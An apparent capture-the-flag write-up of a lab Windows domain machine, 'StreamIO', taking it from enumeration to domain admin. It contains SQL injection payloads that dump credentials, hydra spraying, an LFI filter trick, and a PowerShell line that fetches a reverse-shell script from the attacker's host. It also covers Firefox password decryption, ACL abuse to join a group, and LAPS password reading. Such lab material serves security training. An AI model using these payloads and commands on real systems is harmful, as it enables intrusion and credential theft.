## StreamIO

### Lab Details 

- Difficulty: Medium
- Type: LFI, LAPS, Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-03 22:27:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2025-10-03T22:29:31+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
```

Web apps:
- port 80
		- found domain `http.streamio.htb`
		- unable to find other subdomains
		- unable to find any directories or files 
- port 443
		- found domain `https://streamio.htb`
			- found endpoints 
				- `https://streamio.htb/admin/`
			- found user
				- `oliver@streamio.htb`
		- found subdomain `https://watch.streamio.htb`
			- found endpoints
				- `https://watch.streamio.htb/search.php`
```bash
$ ffuf -u https://watch.streamio.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -e .php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://watch.streamio.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

search.php              [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 101ms]
<SNIP>
```
SMB
- anonymous access is not allowed

#### Initial Foothold
- upon visiting `https://watch.streamio.htb/search.php` we see a search box
- test for `sqli`
```sql
 10' union select 1,2,3,4,5,6 -- 
```
- we get column 2 and 3 as result which means column 2 and 3 can be used for injection 
![[SQLi Union test.png]]
- attempt to inject in to the second column and we get data back 
```sql
10' union select 1,@@version,3,4,5,6 -- -

10' union select 1,SELECT name, database_id, create_date FROM sys.databases;,3,4,5,6 -- -
```
- we can see the database is running `Microsoft SQL Server`
![[SQLi Union @@version.png]]
- get databases `10' union select 1,name,database_id,create_date,5,6 FROM sys.databases -- -`
![[SQLi Union databases.png]]
- enumerate `streamio` database, we see there are two tables 
- query `10' UNION SELECT 1, TABLE_NAME, 3, 4, 5, 6 FROM streamio.INFORMATION_SCHEMA.TABLES --`
![[SQLi Union tables.png]]
- `users` table looks interesting, we can attempt to fetch `username` & `password`
- query `10' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -`
![[SQLi Union cred dump.png]]
- same the username and password into separate files and perform credential spraying using `hydra`
```bash
$ hydra -L users.txt -P passwords.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-15 07:33:38
[DATA] max 16 tasks per 1 server, overall 16 tasks, 144 login tries (l:12/p:12), ~9 tries per task
[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&password=^PASS^:F=Login failed
[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
1 of 1 target successfully completed, 1 valid password found
```
- found valid credential `yoshihide:66boysandgirls..`
- login `https://streamio.htb/login.php`
- get the `PHPID` from `developer console`
```php
PHPSESSID:ot1glf3avvften3d2r50mk6dt3
```
- visit `https://streamio.htb/admin/`
![[AD/Medium/StreamIO/admin dash.png]]
- clicking on different management options and the URL parameters changes
- we can attempt to map out the parameters with `ffuf`
```bash
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' -b PHPSESSID=0p3f7u57i56oc2a4emc7p6il7u --fs 1678

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/admin/?FUZZ=
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Cookie: PHPSESSID=0p3f7u57i56oc2a4emc7p6il7u
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1678
________________________________________________

debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 58ms]
movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 24ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 48ms]
user                    [Status: 200, Size: 2815, Words: 260, Lines: 87, Duration: 8ms]
```
- checking `debug` parameter we get error 
- attempt to perform `LFI` with `debug` parameter fetching `index.php`
- we get response back
![[get index.php.png]]
- save the encoded response and decode with `base64`
```bash
$ cat index.php | base64 -d
�yr<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
	header('HTTP/1.1 403 Forbidden');
	die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Admin panel</title>
	<link rel = "icon" href="/images/icon.png" type = "image/x-icon">
	<!-- Basic -->
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<!-- Mobile Metas -->
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
	<!-- Site Metas -->
	<meta name="keywords" content="" />
	<meta name="description" content="" />
	<meta name="author" content="" />

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

	<!-- Custom styles for this template -->
	<link href="/css/style.css" rel="stylesheet" />
	<!-- responsive style -->
	<link href="/css/responsive.css" rel="stylesheet" />

</head>
<body>
	<center class="container">
		<br>
		<h1>Admin panel</h1>
		<br><hr><br>
		<ul class="nav nav-pills nav-fill">
			<li class="nav-item">
				<a class="nav-link" href="?user=">User management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?staff=">Staff management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?movie=">Movie management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?message=">Leave a message for admin</a>
			</li>
		</ul>
		<br><hr><br>
		<div id="inc">
			<?php
				if(isset($_GET['debug']))
				{
					echo 'this option is for developers only';
					if($_GET['debug'] === "index.php") {
						die(' ---- ERROR ----');
					} else {
						include $_GET['debug'];
					}
				}
				else if(isset($_GET['user']))
					require 'user_inc.php';
				else if(isset($_GET['staff']))
					require 'staff_inc.php';
				else if(isset($_GET['movie']))
					require 'movie_inc.php';
				else 
			?>
		</div>
	</center>
</body>
</html>base64: invalid input
```
- we get database credential but nothing else useful
- enumerate endpoints at `/admin` endpoint with `php` file extension
```bash
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u 'https://streamio.htb/admin/FUZZ' -b PHPSESSID=0p3f7u57i56oc2a4emc7p6il7u --fs 1678 -e .php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/admin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Header           : Cookie: PHPSESSID=0p3f7u57i56oc2a4emc7p6il7u
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1678
________________________________________________

js                      [Status: 301, Size: 153, Words: 9, Lines: 2, Duration: 35ms]
css                     [Status: 301, Size: 154, Words: 9, Lines: 2, Duration: 27ms]
images                  [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 20ms]
Images                  [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 20ms]
fonts                   [Status: 301, Size: 156, Words: 9, Lines: 2, Duration: 7ms]
CSS                     [Status: 301, Size: 154, Words: 9, Lines: 2, Duration: 4ms]
JS                      [Status: 301, Size: 153, Words: 9, Lines: 2, Duration: 6ms]
Js                      [Status: 301, Size: 153, Words: 9, Lines: 2, Duration: 4ms]
master.php              [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 17ms]
```
- we found `master.php`
- visiting the endpoint we get error
![[admin master.png]]
- use the `LFI` found above to fetch the `master.php` file content
```bash
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```
- get response back
![[get encoded master.png]]
- save the output into a file and decode it with base64
```php
$ cat master| base64 -d 
�yr<h1>Movie managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['movie']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST" action="?movie=">
                                <input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```
- `eval(file_get_contents($_POST['include']));` we can attempt to abuse the `eval()` function
- capture the request to `https://streamio.htb/admin/master.php` using `burpsuite`
![[get master.php.png]]
- modify the request method to `post` 
- add `debug` & `include` `POST` parameters
![[rev shell initial foothold.png]]
- inject `include` parameter with a file that is fetching reverse shell like [`Invoke-ConPtyShell.ps1`](https://github.com/antonioCoco/ConPtyShell/tree/master)
- below is an example that fetches and executing `Invoke-ConPtyShell.ps1`
```bash
$ cat get_conty.php 
system("powershell IEX(IWR http://10.10.14.82:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.82 9001");
```
- we get connection back as `yoshihide`
```powershell
$ stty raw -echo; (stty size; cat) | nc -lvnp 9001
listening on [any] 9001 ...
                           connect to [10.10.14.82] from (UNKNOWN) [10.129.47.204] 64253

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin>cd C:\
PS C:\> whoami
streamio\yoshihide
```
#### Lateral Movement (If any)
- from `index.php` we have decoded early there was a `db connection` detail
- search for applications installed, we can see there's `Browser for SQL Server`
```bash 
PS C:\Windows\system32> Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion | Sort-Object DisplayName

DisplayName                                                             DisplayVersion
-----------                                                             --------------
Browser for SQL Server 2019                                             15.0.2000.5
Microsoft Visual C++ 2013 Redistributable (x86) - 12.0.30501            12.0.30501.0
Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.21005           12.0.21005
Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.21005              12.0.21005
Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29913      14.28.29913.0
Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29913      14.28.29913.0
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29913          14.28.29913
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29913             14.28.29913
Microsoft Visual Studio Tools for Applications 2017                     15.0.27520
Microsoft Visual Studio Tools for Applications 2017 x86 Hosting Support 15.0.27520
Mozilla Firefox (x86 en-US)                                             98.0.2
Windows Cache Extension 2.0 for PHP 7.2                                 2.0.8
```
- search if `sqlcmd` is installed
```
PS C:\Windows\system32> if (Get-Command sqlcmd -ErrorAction SilentlyContinue) { "sqlcmd is installed" } else { "sqlcmd is NOT installed" }
sqlcmd is installed 
```
- `sqlcmd` is installed we can use `sqlcmd` to enumerate databases
```bash
PS C:\Users>  sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT DB_NAME(); SELECT name 
>> FROM master..sysdatabases;'

--------------------------------------------------------------------------------------------------------------------------------
master

(1 rows affected)
name
--------------------------------------------------------------------------------------------------------------------------------
master
model
msdb
STREAMIO
streamio_backup

(6 rows affected)
PS C:\Users> sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT name FROM streamio_backup..sysobjects WHERE xtype = "U"'
name
--------------------------------------------------------------------------------------------------------------------------------
movies
users

(2 rows affected)
PS C:\Users> sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'USE STREAMIO_BACKUP; select username,password from users;'
Changed database context to 'streamio_backup'.
username                                           password
-------------------------------------------------- --------------------------------------------------
nikk37                                             389d14cb8e4e9b94b137deb1caf0612a
yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332
James                                              c660060492d9edcaa8332d89c99c9239
Theodore                                           925e5408ecb67aea449373d668b7359e
Samantha                                           083ffae904143c4796e464dac33c1f7d
Lauren                                             08344b85b329d7efd611b7a7743e8a09
William                                            d62be0dc82071bccc1322d64ec5b6c51
Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5
```
- use `crackstation`, we get password for user `nikk37`
```
nikk37:get_dem_girls2@yahoo.com
```
- we can get `reverse-shell` access via `evil-winrm` as user `nikk37`
```bash
$ evil-winrm -i 10.129.47.204 -u nikk37 -p get_dem_girls2@yahoo.com
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nikk37\Documents>
```
#### Privilege Escalation
- load and run `winPEASx86.exe`
- there's `firefox` database file 
```bash
╔══════════╣ Looking for Firefox DBs
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
╚ Run SharpWeb (https://github.com/djhohnstein/SharpWeb)

```
- we can use [`firepwd`](https://github.com/lclevy/firepwd) to get the database credentials
```bash
<snip>
decrypting login/password pairs
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```
- found `JDgodd` user credential however we are unable to get reverse shell access as `JDgodd`
- run `bloodhound` against target as `JDgodd`
```bash
$ bloodhound-python -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -gc  dc.streamio.htb -ns 10.129.47.204 -c al
```
- we see that `JDgodd` has `WriterOwner` access over `CORE STAFF` group and `CORE STAFF` group has `ReadLAPSPassword` over `DC`
![[bloodhound JDgodd.png]]
- to exploit this first we will need to add `JDgodd` to `CORE STAFF` group
```bash
*Evil-WinRM* PS C:\Users\nikk37> $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\nikk37> $Cred = New-Object System.Management.Automation.PSCredential('streamio htb\JDgodd', $SecPassword)
*Evil-WinRM* PS C:\Users\nikk37> Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity 'JDgodd' -Cred $Cred
*Evil-WinRM* PS C:\Users\nikk37> Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
*Evil-WinRM* PS C:\Users\nikk37> Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
```
- check if `JDgodd` has been added
```bash
*Evil-WinRM* PS C:\Users\nikk37>  net group 'CORE STAFF'
Group name     CORE STAFF
Comment

Members

-------------------------------------------------------------------------------
JDgodd
The command completed successfully.
```
- get `LAPS` using `ldapsearch`
```bash
$ ldapsearch -H ldap://streamio.htb -b 'DC=streamIO,DC=htb' -x -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base <DC=streamIO,DC=htb> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd 
#

# DC, Domain Controllers, streamIO.htb
dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: /jNn7M,ec(+AZ$

# search reference
ref: ldap://ForestDnsZones.streamIO.htb/DC=ForestDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://DomainDnsZones.streamIO.htb/DC=DomainDnsZones,DC=streamIO,DC=htb

# search reference
ref: ldap://streamIO.htb/CN=Configuration,DC=streamIO,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```
- we can then get reverse shell via `evil-winrm` as admin using the `LAPS` found
```bash
$ evil-winrm -i streamio.htb -u administrator -p '/jNn7M,ec(+AZ$'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
#### Resources

#### Lesson Learned
